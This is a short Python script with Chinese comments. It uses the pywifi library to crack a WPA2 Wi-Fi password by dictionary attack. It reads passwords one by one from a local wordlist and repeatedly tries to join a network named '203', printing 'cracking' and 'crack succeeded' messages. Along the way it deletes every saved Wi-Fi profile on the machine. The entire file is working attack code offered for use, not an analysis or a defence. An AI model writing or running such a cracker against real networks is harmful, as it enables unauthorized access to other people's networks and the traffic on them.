import pywifi
from pywifi import const
import time


# 测试连接wifi
# ssid 名称  WiFi密码
def wifiConnect(wifiname, wifipwd):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    # 开始断开wifi连接
    ifaces.disconnect()
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # 创建wifi连接文件
        profile = pywifi.Profile()
        # 名称
        profile.ssid = wifiname
        # 密码
        profile.key = wifipwd
        # wifi 加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 网卡开发
        profile.auth = const.AUTH_ALG_OPEN
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP

        # 删除所有的wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        temp_profile = ifaces.add_network_profile(profile)

        # 连接wifi
        ifaces.connect(temp_profile)
        time.sleep(0.1)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


# 读取密码本的密码
def readPwd():
    print('开始破解...')
    path = 'D:\python-stydy\demo\src\dic2.txt'
    file = open(path, 'r')

    wifiPwd = '0'
    while True:
        try:
            wifiPwd = file.readline()
            bo = wifiConnect('203', wifiPwd)
            if bo:
                print('破解成功...密码：%s' % wifiPwd)
                break
            else:
                print('密码错误，重试! 错误密码：%s' % wifiPwd)
            pass
        except:
            print('密码错误，重试!错误密码:%s' % wifiPwd)
            continue
    file.close()


readPwd()
